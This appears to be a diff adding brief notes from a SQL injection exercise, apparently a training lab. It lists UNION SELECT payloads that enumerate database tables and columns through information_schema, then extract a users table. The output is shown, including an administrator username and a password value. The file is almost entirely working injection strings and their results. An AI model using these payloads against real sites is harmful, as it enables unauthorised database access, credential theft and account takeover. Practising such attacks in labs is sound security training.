@@ -1,0 +1,11 @@
+' union SELECT table_name,null FROM information_schema.tables--
+users_bwtupd
+
+' union SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users_bwtupd'--
+column_name
+' union select password_chjaix,username_ixghpz FROm users_bwtupd--
+password_chjaix
+username_ixghpz
+
+administrator
+xzhhgvrjmxwylibab4oo
